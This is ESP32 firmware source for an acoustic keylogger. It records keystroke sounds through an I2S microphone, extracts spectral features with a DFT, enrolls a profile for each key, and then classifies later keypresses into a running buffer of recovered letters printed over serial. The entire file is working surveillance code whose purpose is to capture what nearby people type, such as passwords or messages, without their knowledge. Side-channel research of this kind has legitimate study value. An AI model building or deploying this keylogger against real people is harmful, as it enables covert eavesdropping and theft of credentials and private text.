/*
 * Sonic Acoustic Keylogger - ESP32 Firmware
 * I2S mic captures keystroke sounds, FFT classifies key pressed
 * ML-style feature extraction for acoustic emanation analysis
 */

#include <driver/i2s.h>
#include <math.h>

#define I2S_WS 15
#define I2S_SCK 14
#define I2S_SD_IN 13
#define I2S_PORT I2S_NUM_0
#define SAMPLE_RATE 44100
#define BUFFER_SIZE 1024
#define NUM_FEATURES 16
#define MAX_KEYS 26
#define LED_PIN 2

int16_t audioBuffer[BUFFER_SIZE];
float spectrum[BUFFER_SIZE / 2];
float keyFeatures[NUM_FEATURES];
float keyProfiles[MAX_KEYS][NUM_FEATURES];
bool keyEnrolled[MAX_KEYS];
int enrolledCount = 0;
bool monitoring = false;
float noiseThreshold = 0.05;
String detectedKeys = "";
unsigned long lastKeystroke = 0;

void initI2S() {
  i2s_config_t config = {
    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_RX),
    .sample_rate = SAMPLE_RATE,
    .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,
    .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,
    .communication_format = I2S_COMM_FORMAT_STAND_I2S,
    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,
    .dma_buf_count = 4,
    .dma_buf_len = BUFFER_SIZE
  };
  i2s_pin_config_t pins = {
    .bck_io_num = I2S_SCK, .ws_io_num = I2S_WS,
    .data_out_num = -1, .data_in_num = I2S_SD_IN
  };
  i2s_driver_install(I2S_PORT, &config, 0, NULL);
  i2s_set_pin(I2S_PORT, &pins);
}

void computeSpectrum() {
  for (int k = 0; k < BUFFER_SIZE / 2; k++) {
    float re = 0, im = 0;
    for (int n = 0; n < BUFFER_SIZE; n++) {
      float angle = -2.0 * M_PI * k * n / BUFFER_SIZE;
      float s = audioBuffer[n] / 32768.0;
      re += s * cos(angle);
      im += s * sin(angle);
    }
    spectrum[k] = sqrt(re * re + im * im) / BUFFER_SIZE;
  }
}

bool detectKeystroke() {
  float energy = 0;
  for (int i = 0; i < BUFFER_SIZE; i++) {
    float s = audioBuffer[i] / 32768.0;
    energy += s * s;
  }
  energy = sqrt(energy / BUFFER_SIZE);
  unsigned long now = millis();
  if (energy > noiseThreshold && (now - lastKeystroke) > 80) {
    lastKeystroke = now;
    return true;
  }
  return false;
}

void extractFeatures() {
  int binsPerFeature = (BUFFER_SIZE / 2) / NUM_FEATURES;
  float totalPower = 0;

  for (int f = 0; f < NUM_FEATURES; f++) {
    float bandPower = 0;
    for (int k = f * binsPerFeature; k < (f + 1) * binsPerFeature; k++) {
      bandPower += spectrum[k] * spectrum[k];
    }
    keyFeatures[f] = log(bandPower + 1e-10);
    totalPower += bandPower;
  }
  // Normalize
  if (totalPower > 1e-6) {
    for (int f = 0; f < NUM_FEATURES; f++) {
      keyFeatures[f] /= log(totalPower + 1e-10);
    }
  }
}

void enrollKey(int keyIdx) {
  if (keyIdx >= MAX_KEYS) return;
  memcpy(keyProfiles[keyIdx], keyFeatures, sizeof(keyFeatures));
  keyEnrolled[keyIdx] = true;
  enrolledCount++;
  Serial.printf("Enrolled key '%c' (features captured)\n", 'A' + keyIdx);
}

int classifyKey() {
  float bestDist = 1e10;
  int bestKey = -1;

  for (int k = 0; k < MAX_KEYS; k++) {
    if (!keyEnrolled[k]) continue;
    float dist = 0;
    for (int f = 0; f < NUM_FEATURES; f++) {
      float d = keyFeatures[f] - keyProfiles[k][f];
      dist += d * d;
    }
    dist = sqrt(dist);
    if (dist < bestDist) {
      bestDist = dist;
      bestKey = k;
    }
  }

  if (bestKey >= 0 && bestDist < 2.0) return bestKey;
  return -1;
}

float classificationConfidence(int keyIdx) {
  if (keyIdx < 0) return 0;
  float myDist = 0;
  for (int f = 0; f < NUM_FEATURES; f++) {
    float d = keyFeatures[f] - keyProfiles[keyIdx][f];
    myDist += d * d;
  }
  return max(0.0f, 1.0f - sqrt(myDist) / 3.0f);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Acoustic Keylogger starting...");
  pinMode(LED_PIN, OUTPUT);
  initI2S();
  memset(keyEnrolled, false, sizeof(keyEnrolled));
  Serial.println("Commands: e<A-Z>=enroll key, m=monitor, s=stop, c=clear");
}

void loop() {
  size_t bytesRead;
  i2s_read(I2S_PORT, audioBuffer, sizeof(audioBuffer), &bytesRead, portMAX_DELAY);

  if (detectKeystroke()) {
    computeSpectrum();
    extractFeatures();
    digitalWrite(LED_PIN, HIGH);

    if (monitoring && enrolledCount > 0) {
      int key = classifyKey();
      float conf = classificationConfidence(key);
      if (key >= 0) {
        char detected = 'A' + key;
        detectedKeys += detected;
        Serial.printf("Key: %c (conf: %.0f%%) | Buffer: %s\n",
          detected, conf * 100, detectedKeys.c_str());
      }
    }
    delay(20);
    digitalWrite(LED_PIN, LOW);
  }

  if (Serial.available()) {
    char c = Serial.read();
    if (c == 'e') {
      char key = Serial.read();
      if (key >= 'A' && key <= 'Z') {
        Serial.printf("Press key '%c' now...\n", key);
        delay(500);
        i2s_read(I2S_PORT, audioBuffer, sizeof(audioBuffer), &bytesRead, portMAX_DELAY);
        computeSpectrum();
        extractFeatures();
        enrollKey(key - 'A');
      }
    }
    if (c == 'm') { monitoring = true; Serial.printf("Monitoring (%d keys enrolled)\n", enrolledCount); }
    if (c == 's') { monitoring = false; Serial.println("Stopped"); }
    if (c == 'c') { detectedKeys = ""; Serial.println("Buffer cleared"); }
  }
}
